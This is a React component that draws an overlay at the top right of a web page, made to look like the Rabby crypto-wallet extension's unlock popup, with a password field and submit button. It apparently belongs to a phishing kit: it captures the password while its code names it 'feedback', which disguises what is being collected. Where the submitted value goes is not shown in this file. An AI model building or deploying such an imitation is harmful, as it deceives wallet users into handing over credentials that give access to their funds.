import { motion } from "motion/react";
import { walletModalCopy } from "./copy";
import type { WalletModalProps } from "./types";

const Rabby = ({
  feedback,
  feedbackError,
  onFeedbackChange,
  onSubmit
}: WalletModalProps) => {
  const copy = walletModalCopy.rabby;

  return (
    <motion.aside
      animate={{ opacity: 1, y: 0 }}
      aria-label={copy.dialog_label}
      aria-modal="true"
      className="fixed top-0 right-[120px] z-[101] flex h-[600px] max-h-[calc(100dvh-1rem)] w-[min(402px,calc(100vw-1rem))] flex-col overflow-hidden border border-[#343b53] bg-[linear-gradient(180deg,#dce3ff_0%,#eef2ff_55%,#eaf0ff_100%)] text-[#16254a] shadow-md"
      exit={{ opacity: 0, y: -12 }}
      initial={{ opacity: 0, y: -12 }}
      role="dialog"
      style={{ fontFamily: "Arial, sans-serif" }}
      transition={{ duration: 0.2, ease: "easeOut" }}
    >
      <div className="relative min-h-0 flex-1">
        <button
          className="absolute top-8 left-1/2 flex -translate-x-1/2 cursor-pointer items-center gap-1.5 whitespace-nowrap rounded-lg bg-[#cdd5ff] px-3 py-2 text-[#4c65fe] text-sm transition-colors hover:bg-[rgb(204,210,255)]"
          type="button"
        >
          <svg
            aria-hidden="true"
            className="size-[18px]"
            fill="none"
            height="20"
            viewBox="0 0 20 20"
            width="20"
            xmlns="http://www.w3.org/2000/svg"
          >
            <path
              d="M1.5 1.263V2.67m8.447-1.407V2.67M4.785 5.58c.751 0 1.408-.657 1.408-1.408v-2.91M8.727 8.02a4.305 4.305 0 01-6.1 0"
              stroke="currentColor"
              strokeLinecap="round"
              strokeLinejoin="round"
              strokeWidth="1.25"
            />
            <path
              d="M19.177 1.177l-18 18"
              stroke="currentColor"
              strokeWidth="0.5"
            />
            <path
              d="M18.051 12.009c.452.75.645 1.627.55 2.497v.5c-.001.525.137 1.042.399 1.497M12.607 14.006a1.998 1.998 0 013.996 0v.5c0 1.08.35 2.132.999 2.996"
              stroke="currentColor"
              strokeLinecap="round"
              strokeLinejoin="round"
              strokeWidth="1.25"
            />
            <path
              d="M14.605 14.006v.999A6.992 6.992 0 0015.854 19M12.607 16.004a8.988 8.988 0 00.9 2.996M11.06 18.001a10.989 10.989 0 01-.45-3.496v-.499a3.995 3.995 0 015.993-3.47"
              stroke="currentColor"
              strokeLinecap="round"
              strokeLinejoin="round"
              strokeWidth="1.25"
            />
          </svg>
          <span>{copy.badge}</span>
        </button>
        <img
          alt=""
          aria-hidden="true"
          className="absolute top-[132px] left-1/2 size-[100px] -translate-x-1/2"
          height={100}
          src={copy.logo_src}
          width={100}
        />
        <h2 className="absolute top-[238px] right-4 left-4 text-center font-bold text-[23px]">
          {copy.title}
        </h2>
        <p className="absolute top-[276px] right-4 left-4 text-center text-[#526483] text-sm">
          {copy.subtitle}
        </p>
        <form className="contents" onSubmit={onSubmit}>
          <label className="sr-only" htmlFor="rabby-feedback">
            {copy.feedback_label}
          </label>
          <input
            aria-invalid={Boolean(feedbackError)}
            aria-label={copy.feedback_label}
            autoComplete="new-password"
            className={`absolute top-[326px] right-5 left-5 h-14 w-[calc(100%-2.5rem)] rounded-[10px] border bg-white px-4 text-[#42516f] text-sm tracking-[0.25em] outline-none placeholder:text-[#687995] placeholder:tracking-normal ${feedbackError ? "border-[#f24822] focus:border-[#f24822]" : "border-[#dce3f4] focus:border-[#4c65ff]"}`}
            id="rabby-feedback"
            name="rabby-feedback"
            onChange={(event) => onFeedbackChange(event.target.value)}
            placeholder={copy.feedback_placeholder}
            style={{
              borderWidth: "1px",
              fontFamily:
                '-apple-system, BlinkMacSystemFont, "Helvetica Neue", Roboto, sans-serif'
            }}
            type="password"
            value={feedback}
          />
          {feedbackError ? (
            <div className="absolute top-[398px] right-5 left-5 flex items-center justify-start gap-1 text-sm">
              <p className="text-[#f24822]" role="alert">
                {feedbackError}
              </p>
              {feedbackError === copy.feedback_error ? (
                <a
                  aria-label="Learn more about Rabby Wallet"
                  className="text-[#4c65ff] underline"
                  href={copy.learn_more_url}
                  rel="noopener noreferrer"
                  target="_blank"
                >
                  Learn more?
                </a>
              ) : null}
            </div>
          ) : null}
          <button
            className="absolute top-[470px] right-5 left-5 h-[57px] w-[calc(100%-2.5rem)] rounded-[9px] bg-[#4c65fe] font-semibold text-base text-white transition-colors hover:bg-[#4059f2] disabled:cursor-not-allowed disabled:opacity-50"
            type="submit"
          >
            {copy.button_txt}
          </button>
        </form>
        <a
          className="absolute right-4 bottom-[32px] left-4 text-center text-[#233b73] text-sm hover:underline"
          href={copy.learn_more_url}
          rel="noopener noreferrer"
          target="_blank"
        >
          {copy.learn_more}
        </a>
      </div>
    </motion.aside>
  );
};

export default Rabby;
